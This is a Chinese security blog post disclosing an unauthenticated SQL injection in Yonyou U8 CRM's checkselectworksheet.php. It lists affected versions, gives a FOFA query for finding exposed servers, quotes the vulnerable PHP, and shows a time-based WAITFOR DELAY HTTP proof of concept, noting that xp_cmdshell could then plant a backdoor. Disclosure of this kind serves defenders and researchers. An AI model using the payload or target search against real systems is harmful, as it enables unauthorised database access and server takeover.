---
title: "用友U8 CRM checkselectworksheet.php SQL注入漏洞"
source: https://mrxn.net/jswz/yonyon-u8crm-servicequotation-checkselectworksheet-sqli.html
asset_dir: assets/用友u8-crm-checkselectworksheet.php-sql注入漏洞
---

# 用友U8 CRM checkselectworksheet.php SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/17 08:29
- 1086浏览
- [0评论](#comment)
- 16分钟阅读

深入探索

客户关系

sql

服务器

---

# 漏洞简介

用友U8 CRM[客户关系管理](#)系统是一款专业的企业级CRM[软件](#)，旨在帮助企业高效管理[客户关系](#)、提升销售业绩和提供优质的客户服务。用友 U8 CRM客户关系管理系统 `checkselectworksheet.php` 文件存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xp\_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。

客户关系管理

# 影响版本

V18, V16.5, V16.1, V16.0, V15.1, V13

# fofa语法

> `title="用友U8CRM"`

# 漏洞分析

深入探索

文本剥离工具

SQL注入检测工具

网络安全课程

那直接看 `U8SOFT/turbocrm70/code/www/servicequotation/checkselectworksheet.php` 业务逻辑实现关键部分

```
<?

include_once("tglobal.lib");
    //依次把GET POST 变量变成函数内的变量
    $wsIDs = TGetRequest('wsIDs');//服务工单明细ID
    global $gblDB;
    $checkSql="select distinct(ws.pay_account_id) 
             from tc_worksheet_d wsd
               left join tc_worksheet ws on wsd.ws_id=ws.ws_id
               where ws_d_id in ($wsIDs) ";//服务工单明细只能来源于同一付款客户下   
    $rs=$gblDB->query($checkSql);
    $pay_account_id=array();
    if ($rs)
    {
       while ($rs->fetchRecord())
       {
           if (!isEmptyString($rs->getFieldValueByName("pay_account_id")))
               $pay_account_id[$rs->getFieldValueByName("pay_account_id")] = $rs->getFieldValueByName("pay_account_id");
       }
       $rs->close();
    }
    $result = array();
    //if(count($pay_account_id)!=1 || !$pay_account_id[0]){ 
    if(count($pay_account_id)>1){
       $result['success'] = false; 
       $result['message'] =TDD_GetDatadict()->getStringRes("STR_CHECKACCOUT");
    }
```

`$wsIDs = TGetRequest('wsIDs')` 获取外部输入参数并在 $checkSql 字符串中无任何过滤，无任何过滤和校验，造成[sql注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /servicequotation/checkselectworksheet.php?wsIDs=1);WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
Host: u8crm.mrxn.net
Cookie: PHPSESSID=bgsesstimeout-;
```

[![用友U8 CRM checkselectworksheet.php SQL注入漏洞](images/img-001-bb6c1827db37.webp)](https://image.mrxn.net/87f2994731c84d078b3195445aea28ed.webp)

成功延时 5 秒

SQL注入防护

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
